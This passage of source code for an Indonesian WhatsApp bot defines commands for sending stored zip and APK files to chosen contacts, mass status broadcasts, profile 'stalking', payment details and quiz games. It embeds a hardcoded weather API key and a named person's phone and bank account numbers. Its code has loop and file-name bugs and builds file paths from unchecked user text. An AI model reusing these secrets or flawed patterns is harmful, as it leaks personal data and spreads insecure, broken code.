teksooooo = `│❏ ${x}\n`
}
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip Boedzhanks + sambil reply pesan target* \n\n Contoh 2 : yozip Boedzhanks`
m.reply(teksooooo)
}
break
//=================================================//
case 'yozip':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
hupao.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendzip': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
hupao.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addapk':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (args.length < 1) return reply('Nama apk apa')
let teks = `${text}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await hupao.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break
//=================================================//
case 'delapk':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break
//=================================================//
case 'listapk': {
 if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo = `│❏ ${x}\n`
}
teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk Boedzhanks + sambil reply pesan target* \n\n Contoh 2 : yoapk Boedzhanks`
m.reply(teksoooooo)
}
break
//=================================================//
case 'yoapk':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
hupao.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendapk': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
hupao.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addvn':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
let delb = await hupao.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
await fsx.copy(delb, `./database/Audio/${text}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break
//=================================================//
case 'delvn':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${text}.mp3`)
reply(`Sukses delete vn ${text}`)
}
break
//=================================================//
case 'listvn':{
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│❏ ${x}\n`
}
reply(teksooo)
}
break
//=================================================//
case 'addmsg': {
     if (groupMute) return 'error'
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
 if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
 if (!text) throw `Example : ${prefix + command} nama file`
 let msgs = global.db.data.database
 if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
 msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
//=================================================//
case 'sendlist': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 hupao.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
 m.reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
}
break
//=================================================//
case 'listmsg': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 let msgs = global.db.data.database
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
m.reply(teks)
}
break
//=================================================//
case 'delmsg': case 'deletemsg': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
m.reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break
//=================================================//
case 'getmsg': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 hupao.copyNForward(from, msgs[text.toLowerCase()], true)
}
break
//=================================================//
case 'google': {
     if (groupMute) return 'error'
 if (!text) throw `Example : ${prefix + command} boedzhanks`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `❏ *Title* : ${g.title}\n`
teks += `❏ *Description* : ${g.snippet}\n`
teks += `❏ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break
//=================================================//
case 'pembayaran': case 'nope': case 'listpayment': case 'payment':{
     if (groupMute) return 'error'
await loading()
m.reply(`
◎ © Hay Kak ${pushname} 👋
Selamat ${ucapanWaktu}
Silahkan Melakukan Transfer Dengan No Bawah Yah : 
╭───── Boedzhanks Store ─────
  
❏ Dana : 083807175250
a.n Hardiansyah Ramadhani

❏ Gopay : 083807175250
a.n Hardiansyah Ramadhani

❏ Seabank : 901696426126
a.n Hardiansyah Ramadhani

❏ Bank Jago : 109526411896
a.n Hardiansyah Ramadhani
        
   └──── 𝙱𝚢 Boedzhanks ──┘
   
 Jika sudah Hubungi Owner Dengan Mengetik .owner
`)
}
break
//=================================================//
case 'ppcp': {
     if (groupMute) return 'error'
await loading()
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
hupao.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, {quoted:m})
hupao.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, {quoted:m})
}
break
//=================================================//
case 'coffe': case 'kopi': {
     if (groupMute) return 'error'
await loading()
hupao.sendMessage(from, {image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`},{quoted:m})
}
break
//=================================================//
case 'getname': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (qtod === "true") {
namenye = await hupao.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
hupao.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (qtod === "true") {
try {
pporg = await hupao.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
hupao.sendMessage(from, { image : { url : pporg }, caption:`Done` }, {quoted:m})
} else if (qtod === "false") {
try {
pporgs = await hupao.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
hupao.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, {quoted:m})
}
}
break


//=================================================//
case "setppbot": {
     if (groupMute) return 'error'
if (!isOwner) return m.reply(mess.owner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await hupao.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await hupao.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Sukses`)
} else {
var memeg = await hupao.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Sukses`)
}
}
        break
        case 'pppanjang': case 'setppbot2':{
             if (groupMute) return 'error'
if (isBan) return reply('Lu di ban kocak awokwok') 
if (!isOwner) return reply('Fitur Khusus owner!')
if (!quoted) return reply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Reply foto dgn caption ${prefix + command}`)
let media = await hupao.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await hupao.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
reply("Done!!!")
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('khusus creator bot')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await hupao.downloadAndSaveMediaMessage(m)
await hupao.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply('done')
}
break
//=================================================//
case 'block': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hupao.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hupao.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'tiktokstalk': {
     if (groupMute) return 'error'
    if (!text) return reply(`Username? `)
let res = await dylux.ttStalk(args[0])
let txt = `
┌──「 *TIKTOK STALK* 

▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}
▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
await hupao.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
}
break

            case 'igstalk': {
                 if (groupMute) return 'error'
                if (!text) return reply(`Enter Instagram Username\n\nExample: ${prefix + command} boedzhanks`)
                    let res = await dylux.igStalk(text)
                    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
                     await hupao.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
                }
                break
//=================================================
case 'weather':
case 'cuaca' :
    {
         if (groupMute) return 'error'
    if (!text) return reply('Lokasi mana?')
                let wdata = await axios.get(
                    `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
                );
                let textw = ""
                textw += `*🗺️Weather of  ${text}*\n\n`
                textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
                textw += `*Description:-* ${wdata.data.weather[0].description}\n`
                textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
                textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
                textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
                textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
                textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
                textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
                textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
                textw += `*Country:-* ${wdata.data.sys.country}\n`
    
               hupao.sendMessage(
                    m.chat, {
                        text: textw,
                    }, {
                        quoted: m,
                    }
               )
               }
               break

//=================================================
case 'afk': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${pushname}... Telah Afk Dengan Alasan ${text ? ': ' + text : ''}`)
}
break
//=================================================
case 'buatsw':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
let men = [];
for (let x of pengguna) {
men.push(x)
const result = [ x ]
if (!m.quoted && !text) throw 'reply pesan'
if (m.quoted && m.quoted.mtype === 'conversation' && !text) _m = hupao.sendMessage('status@broadcast', {
text: m.quoted.text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
if (!m.quoted && text) _m = hupao.sendMessage('status@broadcast', {
text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
}
await loading ()
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case "buatswimage":{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading ()
 if (!quoted) throw `Balas image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Balas image dengan caption *${prefix + command}*`
const media = await hupao.downloadAndSaveMediaMessage(quoted)
hupao.sendMessage('status@broadcast', { image: { url: media }}, {statusJidList: pengguna})
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case "buatswvideo":{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading ()
 if (!quoted) throw `Balas video Dengan Caption ${prefix + command}`
if (!/video/.test(mime)) throw `Balas video dengan caption *${prefix + command}*`
const media = await hupao.downloadAndSaveMediaMessage(quoted)
hupao.sendMessage('status@broadcast', { video: { url: media }}, {statusJidList: pengguna})
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'swin':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading ()
if (!text) return m.reply(`masukin text nya`)
hupao.sendMessage('status@broadcast', {
text: `${text}`
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: pengguna
});
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'vnsw':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading ()
if (!text) return m.reply(`masukin text nya yang ada di database listvn`)
var huy = fs.readFileSync(`./database/Audio/${text}.mp3`)
hupao.sendMessage('status@broadcast', {audio: huy, mimetype: 'audio/mp4', ptt:true},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'inisw':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading ()
if (!text) return m.reply(`masukin text nya yang ada di database listvn`)
var buu = fs.readFileSync(`./database/Audio/${text}.mp3`)
hupao.sendMessage('status@broadcast', {audio: buu, mimetype:'audio/mp4', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://instagram.com/@boedzhanks',
title: `Boedzhanks`,
sourceUrl: `https://instagram.com/@Boedzhanks`, 
thumbnail: thumb}}},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'hapusdb':
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading ()
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312@s.whatsapp.net`)
yakiii = text.split("|")[0].replace(/[^0-9]/g, '')
unnnp = pengguna.indexOf(yakiii)
pengguna.splice(unnnp, 1)
fs.writeFileSync('./database/user.json', JSON.stringify(pengguna, null, 2))
m.reply(`Nomor ${yakiii} Telah Di Hapus Dari Database!!!`)
break
//=================================================//
case 'listdb':
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading ()
if (isBan) return m.reply('*Lu Di Ban Owner*')
 teksoooo = '*List Database*\n\n'
for (let i of pengguna) {
teksoooo += `- ${i}\n`
}
teksoooo += `\n*Total : ${pengguna.length}*`
hupao.sendMessage(from, { text: teksoooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": pengguna } })
break
//=================================================
case "buatswptv":
{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading ()
 if (!m.quoted) throw `Balas Video Dengan Caption ${prefix + command}`
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
hupao.relayMessage('status@broadcast', ptv.message, {
statusJidList: pengguna
})
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'toptv':
{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading ()
 if (!m.quoted) throw `Balas Video Dengan Caption ${prefix + command}`
  if (/video/.test(mime)) {
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
hupao.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break
//=================================================
case "buatsws":{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading ()
 if (!quoted) throw `Balas Sticker Dengan Caption ${prefix + command}`
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
const media = await hupao.downloadAndSaveMediaMessage(quoted)
hupao.sendMessage('status@broadcast', { sticker: { url: media }}, {statusJidList: pengguna})
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'family10000000': {
     if (groupMute) return 'error'
 if ('family100'+from in _family100) {
 m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
 throw false
 }
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 _family100['family100'+from] = {
 id: 'family100'+from,
 pesan: await hupao.sendText(from, hasil, m),
 ...random,
 terjawab: Array.from(random.jawaban, () => false),
 hadiah: 6,
 }
}
break
//=================================================//
case 'tebak': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
 if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n 6.lontong`
 if (args[0] === "lagu") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await JSON.parse(fs.readFileSync('./database/Games/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await hupao.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 hupao.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 hupao.sendMessage(m.chat, { image: { url: 'https://w.forfun.com/fetch/20/207ecd8c6bb2ff921944e23bf31416c3.jpeg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'gambar') {
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 hupao.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 hupao.sendMessage(m.chat, { image: { url: 'https://w.forfun.com/fetch/20/207ecd8c6bb2ff921944e23bf31416c3.jpeg' }, caption: `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak gambar`}, {quoted:m}) 
 delete tebakgambar[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kata') {
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 hupao.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 hupao.sendMessage(m.chat, { image: { url: 'https://w.forfun.com/fetch/20/207ecd8c6bb2ff921944e23bf31416c3.jpeg' }, caption: `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kata` }, {quoted:m}) 
 delete tebakkata[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kalimat') {
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 hupao.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 hupao.sendMessage(m.chat, { image: { url: 'https://w.forfun.com/fetch/20/207ecd8c6bb2ff921944e23bf31416c3.jpeg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lirik') {
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 hupao.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
 tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 hupao.sendMessage(m.chat, { image: { url: 'https://w.forfun.com/fetch/20/207ecd8c6bb2ff921944e23bf31416c3.jpeg' }, caption: `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lirik`} , {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lontong') {
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 const createHint = (word) => {
    let hint = '';
    for (let i = 0; i < word.length; i++) {
        if (i === 0 || i === 2) {
            hint += word[i];
        } else {
            hint += ' _';
        }
    }
    return hint;
};
const hint = createHint(result.jawaban);
 hupao.sendText(from, `*Jawablah Pertanyaan Berikut :*\n*Hint : ${hint}*\n*${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(30000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 hupao.sendMessage(m.chat, { image: { url: 'https://w.forfun.com/fetch/20/207ecd8c6bb2ff921944e23bf31416c3.jpeg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
 }
}
break
//=================================================//
case 'kuismath': case 'math': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let { genMath, modes } = require('./src/math.js')
 if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
 let result = await genMath(text.toLowerCase())
 hupao.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
 kuismath[m.sender.split('@')[0]] = result.jawaban
 })
 await sleep(result.waktu)
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
